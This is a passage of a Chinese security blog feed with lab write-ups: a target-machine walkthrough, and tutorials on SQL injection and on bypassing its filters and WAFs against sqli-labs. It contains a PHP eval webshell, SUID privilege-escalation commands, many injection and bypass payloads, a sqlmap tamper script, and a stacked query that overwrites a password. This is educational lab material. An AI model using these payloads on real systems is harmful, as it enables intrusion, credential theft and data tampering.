class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&quot;a&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>kala进入桌面的文件夹下后开启简易的web服务</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m thhp.server 8081</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813799.png" alt="image-20240101175234817"></p><p>在拿到的shell中下载该1.php文件</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011805724.png" alt="image-20240101180545308"></p><h4><span id="6提升权限">6,提升权限</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">python -c &quot;import pty;pty.spawn(&#x27;/bin/bash&#x27;)&quot;</span><br><span class="line">find / -user root -perm -4000 -print 2&gt;/dev/null</span><br><span class="line">find / -name cron.php -exec &quot;/bin/sh&quot; \; </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011813613.png" alt="image-20240101180855301"></p><h4><span id="7结果">7，结果</span></h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202401011812296.png" alt="image-20240101181246805"></p><hr>]]></content>
    
    
      
      
    <summary type="html">&lt;h4&gt;&lt;span id=&quot;1获得ip地址&quot;&gt;1，获得IP地址&lt;/span&gt;&lt;/h4&gt;&lt;p&gt;靶机与Kali在同一VMware中，可先查看靶机的MAC地址，可点击设置—&amp;gt;网络适配器—&amp;gt;高级，找到MAC地址为:00:0C:29:60:07:93&lt;/p&gt;
&lt;img src=</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>三十，SQL注入绕过</title>
    <link href="http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/"/>
    <id>http://example.com/2023/12/28/%E4%B8%89%E5%8D%81%EF%BC%8CSQL%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87/</id>
    <published>2023-12-28T11:41:08.000Z</published>
    <updated>2023-12-28T13:56:26.045Z</updated>
    
    <content type="html"><![CDATA[<p><strong>目录：</strong></p><p>&emsp;<strong>&emsp;1，绕过空格 (注释符&#x2F;* *&#x2F;，%a0)</strong><br>        <strong>&emsp;&emsp;2，引号绕过(使用十六进制)</strong><br>        <strong>&emsp;&emsp;3，逗号绕过(使用from或者offset)</strong><br>        <strong>&emsp;&emsp;4，or and xor not绕过</strong><br>        <strong>&emsp;&emsp;5，绕过注释符号 (#，–(后面跟一个空格) ) 过滤</strong><br>        <strong>&emsp;&emsp;6，绕过union，select，where等</strong><br>        <strong>&emsp;&emsp;7，宽字节注入</strong><br>        <strong>&emsp;&emsp;8，多参数请求拆分</strong><br>        <strong>&emsp;&emsp;9，HTTP参数污染</strong><br>        <strong>&emsp;&emsp;10，编写使用tamper</strong><br>        <strong>&emsp;&emsp;11，堆叠注入</strong><br>        &emsp;&emsp;<strong>12，绕过waf</strong></p><p>在做sqli关卡时，会遇到各种各样的限制，如禁止使用and,or,#注释等等，对此若想继续进行SQL注入，则需使用以下方法来绕过这些限制。</p><h4><span id="1绕过空格注释符x2f-x2fa0">1，绕过空格（注释符&#x2F;* *&#x2F;，%a0）</span></h4><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%20 %09 %0a %0b %0c %0d %a0 %00 /**/  /*!*/ （）</span><br></pre></td></tr></table></figure><p>最基本的绕过方法，用注释替换空格：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/* 注释 */</span><br><span class="line"></span><br><span class="line">/**/表示注释</span><br><span class="line">/*!*/表示在!后还能加入sql语句并执行，只能执行sql版本号支持的sql语句</span><br></pre></td></tr></table></figure><p>例如27a关禁用空格，用%0a来代替，布尔盲注代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ <span class="string">&#x27;%0aand%0aascii(substr(database(),&#123;0&#125;,1))&gt;&#123;1&#125;%0a and&quot;1&quot;=&quot;1&#x27;</span>.<span class="built_in">format</span>(i,tmp)</span><br></pre></td></tr></table></figure><p>26a用（）来代替空格，布尔盲注代码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">paramsGet = url+ <span class="string">&quot;anandd(ascii(substr((select (group_concat(table_name) ) from (infoorrmation_schema.tables) where (table_schema=database())),&#123;0&#125;,1))&gt;&#123;1&#125;)anandd&#x27;1&#x27;=&#x27;1&quot;</span>.<span class="built_in">format</span>(i,tmp)</span><br></pre></td></tr></table></figure><h4><span id="2引号绕过使用十六进制">2，引号绕过（使用十六进制）</span></h4><p>若禁用了双引号“，但我们在以下查询指定表的字段时需要用的双引号</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=&quot;users&quot; and table_schema=database();</span><br></pre></td></tr></table></figure><p>遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select group_concat(column_name)  from information_schema.columns where table_name=0x7573657273 and table_schema=database();</span><br></pre></td></tr></table></figure><h4><span id="3逗号绕过使用from或者offset">3，逗号绕过（使用from或者offset）</span></h4><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select substr(database() from 1 for 1);</span><br><span class="line">select mid(database() from 1 for 1);</span><br></pre></td></tr></table></figure><p>使用join：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">union select 1,2     #等价于</span><br><span class="line">union select * from (select 1)a join (select 2)b</span><br></pre></td></tr></table></figure><p>使用like：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(mid(user(),1,1))=80   #等价于</span><br><span class="line">select user() like &#x27;r%&#x27;</span><br></pre></td></tr></table></figure><p>对于limit可以使用offset来绕过：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from news limit 0,1    #等价于</span><br><span class="line">select * from news limit 1 offset 0</span><br></pre></td></tr></table></figure><h4><span id="4or-and-xor-not绕过">4，or and xor not绕过</span></h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br><span class="line">如果是有以上字符则删除再执行，则使用双写或部分大写部分小写绕过</span><br><span class="line">and=anandd    or=oorr</span><br></pre></td></tr></table></figure><h4><span id="5绕过注释符号后面跟一个空格过滤">5,绕过注释符号（#，–(后面跟一个空格））过滤</span></h4><p>以单引号‘闭合为例</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">id=1&#x27; union select 1,2,3||&#x27;1</span><br><span class="line">and&#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h4><span id="6绕过unionselectwhere等">6，绕过union，select，where等</span></h4><p><strong>（1）使用注释符绕过</strong></p><p>常用注释符：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">//，-- , /**/, #, --+, -- -, ;,%00,--a</span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">U/**/ NION /**/ SE/**/ LECT /**/user，pwd from user</span><br></pre></td></tr></table></figure><p><strong>（2）使用大小写绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UnIoN/**/SeLeCT</span><br></pre></td></tr></table></figure><p><strong>（3）内联注释绕过</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span><br></pre></td></tr></table></figure><p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span><br></pre></td></tr></table></figure><h4><span id="7宽字节注入">7，.宽字节注入</span></h4><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK  编码的时候，会认为两个字符为一个汉字，一般用%df 吃掉 \ ，具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在  %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c  就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=-1%df%27union select 1,user(),3--+</span><br></pre></td></tr></table></figure><h4><span id="8多参数请求拆分">8，多参数请求拆分</span></h4><p>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。</p><p>例如请求URL时，GET参数格式如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=[input1]&amp;b=[input2]</span><br></pre></td></tr></table></figure><p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=[input1] and b=[input2]</span><br></pre></td></tr></table></figure><p>这时就可以将注入语句进行拆分，如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a=union/*&amp;b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure><p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and a=union /*and b=*/select 1,2,3,4</span><br></pre></td></tr></table></figure><h4><span id="9http参数污染">9，HTTP参数污染</span></h4><p>HTTP参数污染是指当同一个参数出现多次，不同的中间件会解析为不同的结果。具体如下图所示：（以参数color&#x3D;red&amp;color&#x3D;blue为例）。</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282025144.jpeg" alt="img"></p><p>例如29关，就只拿到最后以为参数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.55:808/sqli/Less-29/?id=1&amp;id=-1&#x27; union select 1,database(),3 and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><h4><span id="10编写使用tamper">10，编写使用tamper</span></h4><p>在做26a关时禁用了and,or,空格和注释，所有直接使用SQLmap是爆不出数据库的，所以就要使用tamper</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">from lib.core.enums import PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.NORMAL</span><br><span class="line"></span><br><span class="line">def dependencies():</span><br><span class="line">    pass</span><br><span class="line"></span><br><span class="line">def tamper(payload, **kwargs):</span><br><span class="line">    payload = payload.lower()</span><br><span class="line">    payload = payload.replace(&#x27;and&#x27;, &#x27;anandd&#x27;)</span><br><span class="line">    payload = payload.replace(&#x27;or&#x27;, &#x27;oorr&#x27;)</span><br><span class="line">    payload = payload.replace(&#x27; &#x27;, &#x27;%0B&#x27;)</span><br><span class="line">    payload = payload.replace(&quot;#&quot;, &quot;anandd&#x27;1&#x27;=&#x27;1&quot;)</span><br><span class="line">    return payload</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>以上是自己编写的tamper名为sx.py作用是将SQLmap爆库时的语句中被禁用的字符替换为可用的</p><p>将sx.py放入Kali的&#x2F;usr&#x2F;share&#x2F;sqlmap&#x2F;tamper&#x2F;目录下</p><p>使用命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://192.168.2.99:808/sqli/Less-26a/?id=1&quot; --batch -v 3 -- tamper=sx --dbs --level=5 --risk=3</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282035570.png" alt="image-20231228203552469"></p><h4><span id="11堆叠注入">11，堆叠注入</span></h4><p>存在条件：</p><p>1，目标存在sql注入漏洞</p><p>2，目标未对”;”号进行过滤</p><p>3，目标中间层查询数据库信息时可同时执行多条sql语句，例如php中mysqli_multi_query()函数</p><p>在38关，传入单引号报错,发现错误回显分析后构造单引号闭合发现字符型注入</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282043660.png" alt="image-20231228204222976"></p><p>经过测试存在union联合注入,使用联合注入爆破出users表中有id、username、password三个 字段.于是尝试堆叠注入将id为1的用户密码改成123,可以配合联合查询来判断sql是否执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/sqli-labs-master/Less-38/?id=-1%27%20union%20select%201,2,3;update%20users%20set%20password=123%20where%20id=1--+</span><br></pre></td></tr></table></figure><p>再次查询</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282044818.png" alt="image-20231228204329837"></p><p>已经更改，我们打开php源代码看一下，可以看到有mysqli_multi_query()函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">if (mysqli_multi_query($con1, $sql))</span><br><span class="line">&#123;</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    /* store first result set */</span><br><span class="line">    if ($result = mysqli_store_result($con1))</span><br><span class="line">    &#123;</span><br><span class="line">        if($row = mysqli_fetch_row($result))</span><br><span class="line">        &#123;</span><br><span class="line">            echo &#x27;&lt;font size = &quot;5&quot; color= &quot;#00FF00&quot;&gt;&#x27;;</span><br><span class="line">            printf(&quot;Your Username is : %s&quot;, $row[1]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            printf(&quot;Your Password is : %s&quot;, $row[2]);</span><br><span class="line">            echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">            echo &quot;&lt;/font&gt;&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">//            mysqli_free_result($result);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4><span id="12绕过waf">12，绕过waf</span></h4><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282112784.png" alt="image-20231228211209170"></p><p>说明waf已开启</p><p>使用yakit判断该waf拦截哪些字符，插入字典，进行执行</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282118151.png" alt="image-20231228211842979"></p><p>观察响应的数据包大小，发现order by 和union select两组被waf拦截</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282121196.png" alt="image-20231228212141674"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">用/*//*/来代替空格</span><br><span class="line">用/*！版本号*/来包裹关键字</span><br><span class="line">在mysq中 /*!*/ 不是注释，mysql为了保持兼容，它把一些特有的仅在mysql上用的语句放在 /*!*/ 中，这样这些语句如果在其他数据库中是不会被执行，但在mysal中它会执行。如下语/*!50001 select from test*/这里的50001表示假如 数据库是5.00.01及以上版本，该语句才会被执行。</span><br></pre></td></tr></table></figure><p>我们用yakit来测试可用的版本号</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282137417.png" alt="image-20231228213722369"></p><p>最后拼合语句</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,2,3-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282138940.png" alt="image-20231228213827427"></p><p>查数据库，语句为</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.99:8081/sqli/Less-1/?id=0&#x27;/*//*/union/*//*//*!00044select*/1,/*!00044database*//*//*//*!00044()*/,3-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312282141771.png" alt="image-20231228214106412"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;strong&gt;目录：&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&amp;emsp;&lt;strong&gt;&amp;emsp;1，绕过空格 (注释符&amp;#x2F;* *&amp;#x2F;，%a0)&lt;/strong&gt;&lt;br&gt;        &lt;strong&gt;&amp;emsp;&amp;emsp;2，引号绕过(使用十六进制)&lt;/s</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>二十九，SQL注入</title>
    <link href="http://example.com/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/"/>
    <id>http://example.com/2023/12/21/%E4%BA%8C%E5%8D%81%E4%B9%9D%EF%BC%8CSQL%E6%B3%A8%E5%85%A5/</id>
    <published>2023-12-21T11:08:56.000Z</published>
    <updated>2023-12-28T11:35:46.727Z</updated>
    
    <content type="html"><![CDATA[<p><strong>目录：</strong></p><p>&emsp;&emsp; <strong>SQL注入的危害:</strong><br>&emsp;&emsp; <strong>MySQL数据库5.0上下的区别:</strong><br>&emsp;&emsp; <strong>SQL注入的步骤，以sqli练习网站为例:</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>1，使用‘，”，),or 1&#x3D;1&#x2F;1&#x3D;2等来判断是否能进行注入以及闭合</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>2，使用order by 来判断返回列数</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>3，运用union联合查询来判断回显数据的位置</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>4，获取数据库版本和当前查询的数据库的名称</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>5，根据以上获取的信息，拿到当前数据库下的所有表的名称</strong></p><p>&emsp;&emsp;&emsp;&emsp;<strong>6，查询某一张表中的列名，以users表为例</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>7，获取某一张表的所有数据</strong><br>&emsp;&emsp;<strong>报错注入用Postman进行注入基于布尔的盲注</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>1，判断数据库类型</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>2，判断当前数据库名</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>3，判断当前库的表名</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>4，判断表的字段</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>5，爆字段中的数据</strong><br>&emsp;&emsp;&emsp;&emsp;<strong>6,修改后的python代码</strong><br>&emsp;&emsp;<strong>基于时间的盲注</strong><br>&emsp;&emsp;<strong>二次注入</strong><br>&emsp;&emsp;<strong>基于SQL注入拿到webshell</strong><br>&emsp;&emsp;<strong>sQLmap</strong></p><p>&emsp;&emsp;SQL注入（SQL Injection）是一种常见的Web安全漏洞，形成的主要原因是web应用程序在接收相关数据参数时未做好过滤，将其直接带入到数据库中查询，导致攻击者可以拼接执行构造的SQL语句。</p><h4><span id="sql注入的危害">SQL注入的危害：</span></h4><ul><li>数据库信息泄漏：数据库中存放的用户的隐私信息的泄露。</li><li>网页篡改：通过操作数据库对特定网页进行篡改。</li><li>网站被挂马，传播恶意软件：修改数据库一些字段的值，嵌入网马链接，进行挂马攻击。</li><li>数据库被恶意操作：数据库服务器被攻击，数据库的系统管理员帐户被窜改。</li><li>服务器被远程控制，被安装后门：经由数据库服务器提供的操作系统支持，让黑客得以修改或控制操作系统。</li><li>破坏硬盘数据，瘫痪全系统。</li></ul><h4><span id="mysql数据库50上下的区别">MySQL数据库5.0上下的区别：</span></h4><p>​mysql5.0以及5.0以上的版本都存在一个系统自带的系统数据库，是information_schema,而5.0之前的版本不存在且5.0以下的版本是多用户单操作。information_schema数据库中含有三张表（schemata、tables、columns）。这三张表中存放的字段依次为（schema_name）、（table_name,table_schema）、（table_schema,table_name,column_name）</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211921573.png" alt="image-20231221192140754"></p><p>​因此在我们进行sql注入时，当得知mysql的版本是5.0以上的就比较简单了，可以对information_schema数据库进行爆破，来获取想要知道的表、表中的数据等一些重要信息。相比较与5.0以下的版本对其进行注入的时相对来说比较麻烦，需要对数据库进行暴力破解的方式，来爆破其中的敏感数据库，表等信息。</p><h4><span id="sql注入的步骤以sqli练习网站为例">SQL注入的步骤，以sqli练习网站为例：</span></h4><p>以下示例为get请求方式，post请求同理</p><h5><span id="1使用-or-1x3d1x2f1x3d2等来判断是否能进行注入以及闭合">1，使用 <em>‘</em>，*)*,<em>or 1&#x3D;1&#x2F;1&#x3D;2</em>等来判断是否能进行注入以及闭合</span></h5><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211933872.png" alt="image-20231221193313081"></p><p>在上图中根据输入的id&#x3D;1正常，id&#x3D;1’报错和SQL回显的报错语句可判断是这是一个字符型注入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211935391.png" alt="image-20231221193530070"></p><p>在1‘后加入– -表示将后面的内容都注释掉，运行后正常表示判断正确</p><h5><span id="2使用order-by-来判断返回列数">2，使用order by 来判断返回列数</span></h5><p>order by是根据第n列来进行排序，设定不存在的列则会报错</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ order by 4 -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211939882.png" alt="image-20231221193936858"></p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211940402.png" alt="image-20231221194019357"></p><p>根据上图order by 4正常显示,order by 5报错，判断出返回的是4列数据</p><h5><span id="3运用union联合查询来判断回显数据的位置">3，运用union联合查询来判断回显数据的位置</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0’ union select 1,2,3,4 -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211946412.png" alt="image-20231221194258141"></p><p>根据select 1，2，3，4判断出页面上会显示出第2，3列的数据，之后将查询语句和数据放在这两个位置上</p><h5><span id="4获取数据库版本和当前查询的数据库的名称">4，获取数据库版本和当前查询的数据库的名称</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=1’ union select 1,batase(),version()，4 -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211946389.png" alt="image-20231221194617105"></p><p>根据SQL自带的函数database（），version（）可以很容易的拿到当前数据库名和版本信息</p><p>看到版本为5.7.26大于5，则之后可以用自带的系统数据库information_schema来查询我们想要的信息</p><p>以下是常用的SQL函数</p><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211949974.png" alt="image-20231221194905883"></p><h5><span id="5根据以上获取的信息拿到当前数据库下的所有表的名称">5，根据以上获取的信息，拿到当前数据库下的所有表的名称</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(table_name) ,3,4 from information_schema.tables where table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312211958842.png" alt="image-20231221195846821"></p><p>其中union是联合查询，group_concat(table_name)会将其中查到的内容用逗号分隔，information_schema.tables是MySQL5.0以上系统自带的数据库中存放所有表名称的表，where table_schema&#x3D;’security’指定表所在的数据库为security，是上一步所查询出的数据库名称</p><p>根据上图可以看出security数据库中有comments,emails,referers,uagents,users五张表</p><h5><span id="6查询某一张表中的列名以users表为例">6，查询某一张表中的列名，以users表为例</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id=0&#x27; union select 1,group_concat(column_name) ,3 ,4 from information_schema.columns where table_name=&#x27;users&#x27; and table_schema=&#x27;security&#x27;; -- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212007963.png" alt="image-20231221200736740"></p><p>根据查询结果可以看出users表有id,username,password,isadm四个字段</p><h5><span id="7获取某一张表的所有数据">7，获取某一张表的所有数据</span></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.2.59/sqli/Less-1/?id= -1&#x27;union select 1,group_concat(id,&quot;~&quot;,username,&quot;~&quot;,password,&quot;~&quot;,isadm),3 ,4 from users;-- -</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/baiQstar/picgo@main/img/202312212015445.png" alt="image-20231221201525346"></p><h4><span id="报错注入">报错注入</span></h4><p>​报错注入用在数据库的错误信息会回显在网页中的情况，如果联合查询不能使用，首选报错注入。报错注入利用的是数据库的报错信息得到数据库的内容，这里需要构造语句让数据库报错。</p><p>以下是构造好的常用语句，在参数后加and，再将以下语句加入修改参数就可以使用</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">(select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a)</span><br><span class="line"></span><br><span class="line">(extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br><span class="line"></span><br><span class="line">(updatexml(1,concat(0x7e,(select user()),0x7e),1))</span><br><span class="line"></span><br><span class="line">exp(~(select * from(select user())a))</span><br><span class="line">exp:5.5-5.6</span><br><span class="line"></span><br><span class="line">geometrycollection((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multipoint((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">polygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">multipolygon((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">linestring((select * from(select * from(select user())a)b))</span><br><span class="line"></span><br><span class="line">multilinestring((select * from(select * from(select 